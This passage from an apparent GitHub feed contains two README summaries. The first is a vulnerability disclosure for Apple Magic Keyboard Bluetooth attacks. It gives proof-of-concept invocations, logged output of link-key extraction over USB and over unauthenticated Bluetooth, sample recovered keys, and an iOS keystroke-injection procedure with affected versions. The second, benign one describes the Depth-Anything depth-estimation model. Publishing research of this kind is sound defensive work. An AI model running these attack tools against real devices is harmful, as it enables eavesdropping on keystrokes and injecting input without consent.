reconfigured to spoof the target keyboard)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Running the PoC&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code&gt;&amp;gt; ./read-link-key-from-mac.py --help&#xA;usage: read-link-key-from-mac.py [-h] -a KEYBOARD_ADDRESS -s KEYBOARD_SERIAL&#xA;&#xA;options:&#xA;  -h, --help            show this help message and exit&#xA;  -a KEYBOARD_ADDRESS, --keyboard_address KEYBOARD_ADDRESS&#xA;  -s KEYBOARD_SERIAL, --keyboard_serial KEYBOARD_SERIAL&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Invocation&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code&gt;./read-link-key-from-mac.py -a 1c:57:fc:08:65:12 -s F1T2107RUNW12NXA9&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Output&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code&gt;[2024-01-07 10:34:53.910]  Turn on the donor keyboard and plug it into this computer&#xA;[2024-01-07 10:34:58.200]  changing Bluetooth address from 3C:A6:F6:E1:3D:F0 to 1c:57:fc:08:65:12&#xA;[2024-01-07 10:34:58.201]  serial number: F0T230C02AZ0NC1EH -&amp;gt; F1T2107RUNW12NXA9&#xA;[2024-01-07 10:34:58.202]  Unplug the donor keyboard and plug it into the Mac.&#xA;[2024-01-07 10:34:58.202]  Wait a few seconds, then plug it back into this computer.&#xA;[2024-01-07 10:35:02.533]  keyboard was unplugged&#xA;[2024-01-07 10:35:13.463]  keyboard has returned&#xA;[2024-01-07 10:35:13.464]  Mac BT Address - a4:c3:99:e8:a8:6c&#xA;[2024-01-07 10:35:13.464]  BT Link-Key    - c95e3ec98809f2745d32029e7f97b67e&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Magic Keyboard Link Key via Bluetooth&lt;/h3&gt; &#xA;&lt;p&gt;When the Magic Keyboard is plugged into the Mac, the Mac sends the Bluetooth link key to the Magic Keyboard over USB.&lt;/p&gt; &#xA;&lt;p&gt;The link key remains in memory until the Magic Keyboard is powered off, and can be read via an unauthenticated Bluetooth HID service on the keyboard.&lt;/p&gt; &#xA;&lt;p&gt;The unauthenticated Bluetooth HID service becomes available when the Magic Keyboard is unplugged from the Mac, and remains available until the Bluetooth link is established.&lt;/p&gt; &#xA;&lt;p&gt;This is a zero-click attack with a timing component. The PoC does not implement a timing trigger, and instead attempts to connect to the Magic Keyboard in a loop until successful.&lt;/p&gt; &#xA;&lt;h4&gt;Affected Versions&lt;/h4&gt; &#xA;&lt;p&gt;Apple started rolling out &lt;a href=&#34;https://support.apple.com/en-us/HT214050&#34;&gt;Magic Keyboard patches&lt;/a&gt; on 2024-01-09.&lt;/p&gt; &#xA;&lt;p&gt;The following Apple peripherals were tested and found vulnerable to this attack. No other peripherals were tested, so this list may be incomplete.&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Product Name&lt;/th&gt; &#xA;   &lt;th&gt;Model Number&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Magic Keyboard&lt;/td&gt; &#xA;   &lt;td&gt;A2450&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Magic Keyboard with Touch ID&lt;/td&gt; &#xA;   &lt;td&gt;A2449&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Magic Keyboard with Numeric Keypad&lt;/td&gt; &#xA;   &lt;td&gt;A1843&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Magic Keyboard with Touch ID and Numeric Keypad&lt;/td&gt; &#xA;   &lt;td&gt;A2520&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Magic Mouse&lt;/td&gt; &#xA;   &lt;td&gt;A1657&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h4&gt;Starting State&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Magic Keyboard is powered on and plugged into the Mac&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Running the PoC&lt;/h4&gt; &#xA;&lt;p&gt;Plug the Magic Keyboard into the Linux computer with a Lightning-to-USB cable, then run the script. Once the script is running, unplug the keyboard from the Mac.&lt;/p&gt; &#xA;&lt;p&gt;When the keyboard is unplugged, there is a race to connect to the keyboard between the attacker machine and the Mac.&lt;/p&gt; &#xA;&lt;p&gt;The PoC will typically connect to the Magic Keyboard either ~5 or ~25 seconds after the keyboard is unplugged from the Mac. Sometimes the Mac will win the race, and when it does, the PoC will not complete.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;./read-link-key-lightning.py &amp;lt;Magic-Keyboard-BT-Address&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Invocation&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code&gt;./read-link-key-bluetooth.py 1c:57:dc:88:55:02&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Output&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code&gt;[2024-01-07 13:09:59.311] connecting to 1c:57:dc:88:55:02 on port 17&#xA;[2024-01-07 13:10:00.313] ERROR connecting on port 17: timed out&#xA;[2024-01-07 13:10:00.314] connecting to 1c:57:dc:88:55:02 on port 17&#xA;[2024-01-07 13:10:00.316] ERROR connecting on port 17: [Errno 22] Invalid argument&#xA;[2024-01-07 13:10:00.318] connecting to 1c:57:dc:88:55:02 on port 17&#xA;[2024-01-07 13:10:01.359] ERROR connecting on port 17: timed out&#xA;[2024-01-07 13:10:01.361] connecting to 1c:57:dc:88:55:02 on port 17&#xA;[2024-01-07 13:10:01.362] ERROR connecting on port 17: [Errno 22] Invalid argument&#xA;[2024-01-07 13:10:01.364] connecting to 1c:57:dc:88:55:02 on port 17&#xA;[2024-01-07 13:10:02.407] ERROR connecting on port 17: timed out&#xA;[2024-01-07 13:10:02.408] connecting to 1c:57:dc:88:55:02 on port 17&#xA;[2024-01-07 13:10:02.410] ERROR connecting on port 17: [Errno 22] Invalid argument&#xA;[2024-01-07 13:10:02.411] connecting to 1c:57:dc:88:55:02 on port 17&#xA;[2024-01-07 13:10:03.448] ERROR connecting on port 17: timed out&#xA;[2024-01-07 13:10:03.449] connecting to 1c:57:dc:88:55:02 on port 17&#xA;[2024-01-07 13:10:03.451] ERROR connecting on port 17: [Errno 22] Invalid argument&#xA;[2024-01-07 13:10:03.452] connecting to 1c:57:dc:88:55:02 on port 17&#xA;[2024-01-07 13:10:04.512] ERROR connecting on port 17: timed out&#xA;[2024-01-07 13:10:04.513] connecting to 1c:57:dc:88:55:02 on port 17&#xA;[2024-01-07 13:10:04.515] ERROR connecting on port 17: [Errno 22] Invalid argument&#xA;[2024-01-07 13:10:04.516] connecting to 1c:57:dc:88:55:02 on port 17&#xA;[2024-01-07 13:10:05.568] ERROR connecting on port 17: timed out&#xA;[2024-01-07 13:10:05.569] connecting to 1c:57:dc:88:55:02 on port 17&#xA;[2024-01-07 13:10:05.638] ERROR connecting on port 17: [Errno 22] Invalid argument&#xA;[2024-01-07 13:10:05.640] connecting to 1c:57:dc:88:55:02 on port 17&#xA;[2024-01-07 13:10:06.680] ERROR connecting on port 17: timed out&#xA;[2024-01-07 13:10:06.681] connecting to 1c:57:dc:88:55:02 on port 17&#xA;[2024-01-07 13:10:07.682] ERROR connecting on port 17: timed out&#xA;[2024-01-07 13:10:07.684] connecting to 1c:57:dc:88:55:02 on port 17&#xA;[2024-01-07 13:10:08.685] ERROR connecting on port 17: timed out&#xA;[2024-01-07 13:10:08.687] connecting to 1c:57:dc:88:55:02 on port 17&#xA;[2024-01-07 13:10:09.689] ERROR connecting on port 17: timed out&#xA;[2024-01-07 13:10:09.690] connecting to 1c:57:dc:88:55:02 on port 17&#xA;[2024-01-07 13:10:10.691] ERROR connecting on port 17: timed out&#xA;[2024-01-07 13:10:10.693] connecting to 1c:57:dc:88:55:02 on port 17&#xA;[2024-01-07 13:10:11.694] ERROR connecting on port 17: timed out&#xA;[2024-01-07 13:10:11.696] connecting to 1c:57:dc:88:55:02 on port 17&#xA;[2024-01-07 13:10:12.697] ERROR connecting on port 17: timed out&#xA;[2024-01-07 13:10:12.699] connecting to 1c:57:dc:88:55:02 on port 17&#xA;[2024-01-07 13:10:13.700] ERROR connecting on port 17: timed out&#xA;[2024-01-07 13:10:13.702] connecting to 1c:57:dc:88:55:02 on port 17&#xA;[2024-01-07 13:10:14.704] ERROR connecting on port 17: timed out&#xA;[2024-01-07 13:10:14.705] connecting to 1c:57:dc:88:55:02 on port 17&#xA;[2024-01-07 13:10:15.707] ERROR connecting on port 17: timed out&#xA;[2024-01-07 13:10:15.708] connecting to 1c:57:dc:88:55:02 on port 17&#xA;[2024-01-07 13:10:16.709] ERROR connecting on port 17: timed out&#xA;[2024-01-07 13:10:16.711] connecting to 1c:57:dc:88:55:02 on port 17&#xA;[2024-01-07 13:10:17.712] ERROR connecting on port 17: timed out&#xA;[2024-01-07 13:10:17.714] connecting to 1c:57:dc:88:55:02 on port 17&#xA;[2024-01-07 13:10:18.715] ERROR connecting on port 17: timed out&#xA;[2024-01-07 13:10:18.717] connecting to 1c:57:dc:88:55:02 on port 17&#xA;[2024-01-07 13:10:19.719] ERROR connecting on port 17: timed out&#xA;[2024-01-07 13:10:19.720] connecting to 1c:57:dc:88:55:02 on port 17&#xA;[2024-01-07 13:10:20.722] ERROR connecting on port 17: timed out&#xA;[2024-01-07 13:10:20.723] connecting to 1c:57:dc:88:55:02 on port 17&#xA;[2024-01-07 13:10:21.725] ERROR connecting on port 17: timed out&#xA;[2024-01-07 13:10:21.726] connecting to 1c:57:dc:88:55:02 on port 17&#xA;[2024-01-07 13:10:22.728] ERROR connecting on port 17: timed out&#xA;[2024-01-07 13:10:22.729] connecting to 1c:57:dc:88:55:02 on port 17&#xA;[2024-01-07 13:10:23.731] ERROR connecting on port 17: timed out&#xA;[2024-01-07 13:10:23.732] connecting to 1c:57:dc:88:55:02 on port 17&#xA;[2024-01-07 13:10:24.734] ERROR connecting on port 17: timed out&#xA;[2024-01-07 13:10:24.735] connecting to 1c:57:dc:88:55:02 on port 17&#xA;[2024-01-07 13:10:25.737] ERROR connecting on port 17: timed out&#xA;[2024-01-07 13:10:25.738] connecting to 1c:57:dc:88:55:02 on port 17&#xA;[2024-01-07 13:10:26.739] ERROR connecting on port 17: timed out&#xA;[2024-01-07 13:10:26.741] connecting to 1c:57:dc:88:55:02 on port 17&#xA;[2024-01-07 13:10:26.824] ERROR connecting on port 17: [Errno 22] Invalid argument&#xA;[2024-01-07 13:10:26.826] connecting to 1c:57:dc:88:55:02 on port 17&#xA;[2024-01-07 13:10:27.868] ERROR connecting on port 17: timed out&#xA;[2024-01-07 13:10:27.869] connecting to 1c:57:dc:88:55:02 on port 17&#xA;[2024-01-07 13:10:28.262] SUCCESS! connected on port 17&#xA;[2024-01-07 13:10:28.264] connecting to 1c:57:dc:88:55:02 on port 19&#xA;[2024-01-07 13:10:28.290] SUCCESS! connected on port 19&#xA;[2024-01-07 13:10:28.291] [TX-17] 53ff34&#xA;[2024-01-07 13:10:28.346] [RX-17] 00&#xA;[2024-01-07 13:10:28.346] [TX-17] 43f0&#xA;[2024-01-07 13:10:28.414] [RX-17] a3f0340347011c57dc88550200254000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#xA;[2024-01-07 13:10:28.414] [TX-17] 53ff35&#xA;[2024-01-07 13:10:28.458] [RX-17] 00&#xA;[2024-01-07 13:10:28.458] [TX-17] 43f0&#xA;[2024-01-07 13:10:28.498] [RX-17] a3f035010150de06a8e1ca80b480523b23bbff5ea40c52e88f1905&#xA;Model     0    - Magic Keyboard&#xA;BT Address     - 1c:57:dc:88:55:02&#xA;Mac BT Address - 50&lt;span&gt;ðŸ‡©ðŸ‡ª&lt;/span&gt;06:a8:e1:ca&#xA;BT Link Key    - 05198fe8520ca45effbb233b5280b480&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;iOS Keystroke Injection&lt;/h3&gt; &#xA;&lt;p&gt;When an iPhone is attempting to connect to a paired Magic Keyboard over Bluetooth, an attacker can spoof the Magic Keyboard to the iPhone, pair a virtual Bluetooth keyboard, and inject keystrokes without user confirmation.&lt;/p&gt; &#xA;&lt;p&gt;This attack has a timing component, where the attacker must connect to the iPhone at the precise moment the iPhone attempts to connect to the Magic Keyboard.&lt;/p&gt; &#xA;&lt;p&gt;The included PoC fires when the iPhone attempts to connect to its paired Magic Keyboard. This uses the same SDP timing trigger as the macOS PoC, triggering when the iPhone is connecting to its paired Magic Keyboard. This is a zero-click attack that requires observing a user connect to their paired Magic Keyboard.&lt;/p&gt; &#xA;&lt;h4&gt;Affected Versions&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;iOS 17 is vulnerable prior to 17.2&lt;/li&gt; &#xA; &lt;li&gt;iOS 16 is vulnerable with no patch expected&lt;/li&gt; &#xA; &lt;li&gt;iOS 15 and older were not tested&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Starting State&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The iPhone is paired with a Magic Keyboard, and the keyboard is out of range or powered off.&lt;/li&gt; &#xA; &lt;li&gt;When the user tries to connect to their Magic Keyboard, the PoC injects keystrokes to open a web browser and perform a Google search.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Running the PoC&lt;/h4&gt; &#xA;&lt;p&gt;&lt;strong&gt;NOTE: BlueZ must be running in compatibility mode on the attacker machine for this PoC. The iPhone PoC script is found in iphone-poc.zip&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;&amp;gt; ./iphone-poc.py&#xA;usage: ./iphone-poc.py &amp;lt;hciX&amp;gt; &amp;lt;BT_ADDR_IPHONE&amp;gt; &amp;lt;BT_ADDR_KEYBOARD&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;Invocation&lt;/h5&gt; &#xA;&lt;pre&gt;&lt;code&gt;./iphone-poc.py hci1 4C:20:B8:D6:63:45 1C:57:DC:88:55:02&#xA;&lt;/code&gt;&lt;/pre&gt;</summary>
  </entry>
  <entry>
    <title>LiheYoung/Depth-Anything</title>
    <updated>2024-01-25T01:39:30Z</updated>
    <id>tag:github.com,2024-01-25:/LiheYoung/Depth-Anything</id>
    <link href="https://github.com/LiheYoung/Depth-Anything" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Depth Anything: Unleashing the Power of Large-Scale Unlabeled Data&lt;/p&gt;&lt;hr&gt;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;h2&gt;Depth Anything: Unleashing the Power of Large-Scale Unlabeled Data&lt;/h2&gt; &#xA; &lt;p&gt;&lt;a href=&#34;https://liheyoung.github.io/&#34;&gt;&lt;strong&gt;Lihe Yang&lt;/strong&gt;&lt;/a&gt;&lt;sup&gt;1&lt;/sup&gt; Â· &lt;a href=&#34;https://scholar.google.com/citations?user=NmHgX-wAAAAJ&#34;&gt;&lt;strong&gt;Bingyi Kang&lt;/strong&gt;&lt;/a&gt;&lt;sup&gt;2+&lt;/sup&gt; Â· &lt;a href=&#34;http://speedinghzl.github.io/&#34;&gt;&lt;strong&gt;Zilong Huang&lt;/strong&gt;&lt;/a&gt;&lt;sup&gt;2&lt;/sup&gt; Â· &lt;a href=&#34;https://xiaogang00.github.io/&#34;&gt;&lt;strong&gt;Xiaogang Xu&lt;/strong&gt;&lt;/a&gt;&lt;sup&gt;3,4&lt;/sup&gt; Â· &lt;a href=&#34;https://sites.google.com/site/jshfeng/&#34;&gt;&lt;strong&gt;Jiashi Feng&lt;/strong&gt;&lt;/a&gt;&lt;sup&gt;2&lt;/sup&gt; Â· &lt;a href=&#34;https://hszhao.github.io/&#34;&gt;&lt;strong&gt;Hengshuang Zhao&lt;/strong&gt;&lt;/a&gt;&lt;sup&gt;1+&lt;/sup&gt;&lt;/p&gt; &#xA; &lt;p&gt;&lt;sup&gt;1&lt;/sup&gt;The University of Hong Kong Â· &lt;sup&gt;2&lt;/sup&gt;TikTok Â· &lt;sup&gt;3&lt;/sup&gt;Zhejiang Lab Â· &lt;sup&gt;4&lt;/sup&gt;Zhejiang University&lt;/p&gt; &#xA; &lt;p&gt;&lt;sup&gt;+&lt;/sup&gt;corresponding authors&lt;/p&gt; &#xA; &lt;p&gt;&lt;a href=&#34;https://arxiv.org/abs/2401.10891&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/arXiv-Depth Anything-red&#34; alt=&#34;Paper PDF&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://depth-anything.github.io&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/Project_Page-Depth Anything-green&#34; alt=&#34;Project Page&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://huggingface.co/spaces/LiheYoung/Depth-Anything&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/%F0%9F%A4%97%20Hugging%20Face-Spaces-blue&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://huggingface.co/papers/2401.10891&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/%F0%9F%A4%97%20Hugging%20Face-Paper-yellow&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;/div&gt; &#xA;&lt;p&gt;This work presents Depth Anything, a highly practical solution for robust monocular depth estimation by training on a combination of 1.5M labeled images and &lt;strong&gt;62M+ unlabeled images&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/LiheYoung/Depth-Anything/main/assets/teaser.png&#34; alt=&#34;teaser&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;News&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;2024-01-22:&lt;/strong&gt; Paper, project page, code, models, and demo are released.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Features of Depth Anything&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Relative depth estimation&lt;/strong&gt;:&lt;/p&gt; &lt;p&gt;Our foundation models listed &lt;a href=&#34;https://huggingface.co/spaces/LiheYoung/Depth-Anything/tree/main/checkpoints&#34;&gt;here&lt;/a&gt; can provide relative depth estimation for any given image robustly. Please refer &lt;a href=&#34;https://raw.githubusercontent.com/LiheYoung/Depth-Anything/main/#running&#34;&gt;here&lt;/a&gt; for details.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Metric depth estimation&lt;/strong&gt;&lt;/p&gt; &lt;p&gt;We fine-tune our Depth Anything model with metric depth information from NYUv2 or KITTI. It offers strong capabilities of both in-domain and zero-shot metric depth estimation. Please refer &lt;a href=&#34;https://raw.githubusercontent.com/LiheYoung/Depth-Anything/main/metric_depth&#34;&gt;here&lt;/a&gt; for details.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Better depth-conditioned ControlNet&lt;/strong&gt;&lt;/p&gt; &lt;p&gt;We re-train &lt;strong&gt;a better depth-conditioned ControlNet&lt;/strong&gt; based on Depth Anything. It offers more precise synthesis than the previous MiDaS-based ControlNet. Please refer &lt;a href=&#34;https://raw.githubusercontent.com/LiheYoung/Depth-Anything/main/controlnet/&#34;&gt;here&lt;/a&gt; for details.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Downstream high-level scene understanding&lt;/strong&gt;&lt;/p&gt; &lt;p&gt;The Depth Anything encoder can be fine-tuned to downstream high-level perception tasks, &lt;em&gt;e.g.&lt;/em&gt;, semantic segmentation, 86.2 mIoU on Cityscapes and 59.4 mIoU on ADE20K. Please refer &lt;a href=&#34;https://raw.githubusercontent.com/LiheYoung/Depth-Anything/main/semseg/&#34;&gt;here&lt;/a&gt; for details.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Performance&lt;/h2&gt; &#xA;&lt;p&gt;Here we compare our Depth Anything with the previously best MiDaS v3.1 BEiT&lt;sub&gt;L-512&lt;/sub&gt; model.&lt;/p&gt; &#xA;&lt;p&gt;Please note that the latest MiDaS is also trained on KITTI and NYUv2, while we do not.&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Method&lt;/th&gt; &#xA;   &lt;th align=&#34;right&#34;&gt;Params&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;KITTI&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;NYUv2&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;Sintel&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;DDAD&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;ETH3D&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;DIODE&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;right&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;AbsRel&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;$\delta_1$&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;AbsRel&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;$\delta_1$&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;AbsRel&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;$\delta_1$&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;AbsRel&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;$\delta_1$&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;AbsRel&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;$\delta_1$&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;AbsRel&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;$\delta_1$&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;MiDaS&lt;/td&gt; &#xA;   &lt;td align=&#34;right&#34;&gt;345.0M&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;0.127&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;0.850&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;0.048&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;em&gt;0.980&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;0.587&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;0.699&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;0.251&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;0.766&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;0.139&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;0.867&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;0.075&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;0.942&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;strong&gt;Ours-S&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;right&#34;&gt;24.8M&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;0.080&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;0.936&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;0.053&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;0.972&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;0.464&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;0.739&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;0.247&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;0.768&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;0.127&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;strong&gt;0.885&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;0.076&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;0.939&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;strong&gt;Ours-B&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;right&#34;&gt;97.5M&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;em&gt;0.080&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;em&gt;0.939&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;em&gt;0.046&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;0.979&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;strong&gt;0.432&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;em&gt;0.756&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;em&gt;0.232&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;em&gt;0.786&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;strong&gt;0.126&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;em&gt;0.884&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;em&gt;0.069&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;em&gt;0.946&lt;/em&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;strong&gt;Ours-L&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;right&#34;&gt;335.3M&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;strong&gt;0.076&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;strong&gt;0.947&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;strong&gt;0.043&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;strong&gt;0.981&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;em&gt;0.458&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;strong&gt;0.760&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;strong&gt;0.230&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;strong&gt;0.789&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;em&gt;0.127&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;0.882&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;strong&gt;0.066&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;strong&gt;0.952&lt;/strong&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;p&gt;We highlight the &lt;strong&gt;best&lt;/strong&gt; and &lt;em&gt;second best&lt;/em&gt; results in &lt;strong&gt;bold&lt;/strong&gt; and &lt;em&gt;italic&lt;/em&gt; respectively (&lt;strong&gt;better results&lt;/strong&gt;: AbsRel $\downarrow$ , $\delta_1 \uparrow$).&lt;/p&gt; &#xA;&lt;h2&gt;Pre-trained models&lt;/h2&gt; &#xA;&lt;p&gt;We provide three models of varying scales for robust relative depth estimation:&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th align=&#34;left&#34;&gt;Model&lt;/th&gt; &#xA;   &lt;th 